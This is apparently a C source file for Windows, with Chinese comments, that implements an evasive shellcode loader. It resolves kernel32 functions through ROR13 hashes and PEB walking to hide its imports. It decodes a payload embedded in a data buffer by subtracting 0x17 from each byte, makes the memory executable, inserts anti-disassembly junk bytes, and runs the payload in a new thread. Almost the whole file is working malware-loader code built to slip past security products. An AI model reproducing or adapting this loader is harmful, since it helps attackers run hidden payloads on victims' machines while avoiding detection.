#include "mm.h"
#include <windows.h>
#include <winternl.h>
#include <wchar.h>


DWORD __stdcall ror13_hash(const unsigned char* string)
{
	DWORD hash = 0;
	while (*string) {
		DWORD val = *string;
		hash = (hash >> 13) | (hash << 19);  // ROR 13
		val |= 32;
		hash += val;
		string++;
	}
	return hash;
}

FARPROC __stdcall GetProcAddress_byHash(HMODULE module, DWORD hash)//不一定是传入hash,也可以是传输字符串的
{
	IMAGE_DOS_HEADER* dos_header;
	IMAGE_NT_HEADERS* nt_headers;
	IMAGE_EXPORT_DIRECTORY* export_dir;
	DWORD* names, *funcs;
	WORD* nameords;
	DWORD hash_calc;
	int i;
	char* string;
	WORD nameord;
	DWORD funcrva;

	dos_header = (IMAGE_DOS_HEADER*)module;
	nt_headers = (IMAGE_NT_HEADERS*)((char*)module + dos_header->e_lfanew);
	export_dir = (IMAGE_EXPORT_DIRECTORY*)((char*)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	names = (DWORD*)((char*)module + export_dir->AddressOfNames);
	funcs = (DWORD*)((char*)module + export_dir->AddressOfFunctions);
	nameords = (WORD*)((char*)module + export_dir->AddressOfNameOrdinals);

	for (i = 0; i < export_dir->NumberOfNames; i++)
	{
		string = (char*)module + names[i];
		hash_calc = ror13_hash(string);
		//printf("0x%08x %s\n", hash_calc, string);
		//这里采用hash的方式对比,,,当然可以明文字符串做一个对比
		if (hash == hash_calc)
		{
			nameord = nameords[i];
			funcrva = funcs[nameord];
			return (FARPROC)((char*)module + funcrva);
		}
	}

	return NULL;
}

//void genHash() {
//	char* data[] = {
//		"VirtualAlloc",
//		"VirtualProtect",
//		"CreateThread",
//		"WaitForSingleObject",
//	};
//	int len = 4;
//	for (int i = 0; i < len; i++) {
//		printf("0x%08X ,//%s\n", ror13_hash(data[i]), data[i]);
//	}
//}
//int main()
//{
//	DWORD funcArrHash[] = {
//		0x91F1CA54,//VirtualAlloc
//		0x89C6C61B,//VirtualProtect
//		0xCA6BD07B,//CreateThread
//		0xD64659BD,//WaitForSingleObject
//	};
//	//genHash(); 
//
//
//	void* tmp[4];
//
//	HMODULE k32 = GetModuleHandle(TEXT("kernel32.dll"));
//	for (int i = 0; i < 4; i++) {
//		tmp[i] = GetProcAddress_byHash(k32, funcArrHash[i]);
//	}
//	return 0;
//
//
//}



DWORD __stdcall unicode_ror13_hash(const WCHAR* unicode_string)
{
	DWORD hash = 0;

	while (*unicode_string)
	{
		DWORD val = (DWORD)*unicode_string++;
		//这里,我认为要大小或者小写转化..是自己单独增加的
		hash = (hash >> 13) | (hash << 19); // ROR 13
		val |= 32;
		hash += val;
	}
	return hash;
}
PPEB __declspec(naked) get_peb(void)
{
	__asm {
		mov eax, fs:[0x30]
			ret
	}
}
HMODULE __stdcall GetModuleHandle_byHash(DWORD hash)
{
	PPEB peb;
	LDR_DATA_TABLE_ENTRY* module_ptr, *first_mod;

	peb = get_peb();

	module_ptr = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
	first_mod = module_ptr;
	do
	{
		if (unicode_ror13_hash((WCHAR*)module_ptr->FullDllName.Buffer) == hash)
		{
			return ((PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)module_ptr - 2 * sizeof(void*)))->DllBase; //晚
		}
		else
		{
			module_ptr = ((PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)module_ptr - 2 * sizeof(void*)))->InMemoryOrderLinks.Flink;
		}
	} while (module_ptr);   // because the list wraps,

	return INVALID_HANDLE_VALUE;
}

//int main() {
//	//DWORD dwk32 = unicode_ror13_hash(L"KERNEL32.DLL");
//	//printf("%08X", dwk32);
//
//	DWORD dwk32 = 0x8FECD63F;
//	HMODULE lp_k32 = GetModuleHandle_byHash(dwk32);
//	return 0;
//}

typedef LPVOID (WINAPI *TYPE_VirtualAlloc)(
_In_opt_ LPVOID lpAddress,
_In_ SIZE_T dwSize,
_In_ DWORD flAllocationType,
_In_ DWORD flProtect
);
typedef BOOL(WINAPI *TYPE_VirtualProtect)(
_In_ LPVOID lpAddress,
_In_ SIZE_T dwSize,
_In_ DWORD flNewProtect,
_Out_ PDWORD lpflOldProtect
);
typedef HANDLE(WINAPI *TYPE_CreateThread)(
_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
_In_ SIZE_T dwStackSize,
_In_ LPTHREAD_START_ROUTINE lpStartAddress,
_In_opt_ __drv_aliasesMem LPVOID lpParameter,
_In_ DWORD dwCreationFlags,
_Out_opt_ LPDWORD lpThreadId
);

DWORD WINAPI test (LPVOID lpThreadParameter){
	MessageBoxA(0, "hello world", "win10-21h2", 0);
	return 0;
}
void showMsg2(char* lpData, int shellcode_size){

	DWORD dwk32 = 0x8FECD63F;
	DWORD funcArrHash[] = {
		0x91F1CA54,//VirtualAlloc
		0x89C6C61B,//VirtualProtect
		0xCA6BD07B,//CreateThread
		0xD64659BD,//WaitForSingleObject
	};
	TYPE_VirtualProtect lp_VirtualAlloc=0;
	TYPE_VirtualProtect lp_VirtualProtect=0;
	TYPE_CreateThread lp_CreateThread=0;
	HMODULE lp_k32 = GetModuleHandle_byHash(dwk32);

	lp_VirtualAlloc = GetProcAddress_byHash(lp_k32, funcArrHash[0]);
	lp_VirtualProtect = GetProcAddress_byHash(lp_k32, funcArrHash[1]);
	lp_CreateThread = GetProcAddress_byHash(lp_k32, funcArrHash[2]);
		
	unsigned char* shellcode = (char*)lp_VirtualAlloc(
			NULL,
			4096,
			MEM_COMMIT,
			PAGE_READWRITE  //只申请可读可写
			);
	DWORD dwOldProtect = 0;
	DWORD dwThreadId = 0;
	unsigned char a = 0;// shellcode[i];
	//unsigned char b = 0x17;
	memcpy(shellcode, (char*)lpData + 0x300 - 0x10 + 2, shellcode_size); //将shellcode复制到可读可写的内存中
	for (int i = 0; i < shellcode_size; i++){
		 //a = shellcode[i];
		//xor
		//原子操作
		 shellcode[i] = shellcode[i] - 0x17;
	}

	lp_VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &dwOldProtect); //更改属性为可执行
	__asm{
		js tag1;
		jns tag1;
		_emit 0xff;
		_emit 0xe8;
	tag1:

	}
	HANDLE hThread = lp_CreateThread(
		NULL, // 安全描述符
		NULL, // 栈的大小
		(LPTHREAD_START_ROUTINE)shellcode, // 函数
		NULL, // 参数
		NULL, // 线程标志
		&dwThreadId // 线程ID
		);
		 
	 

	
}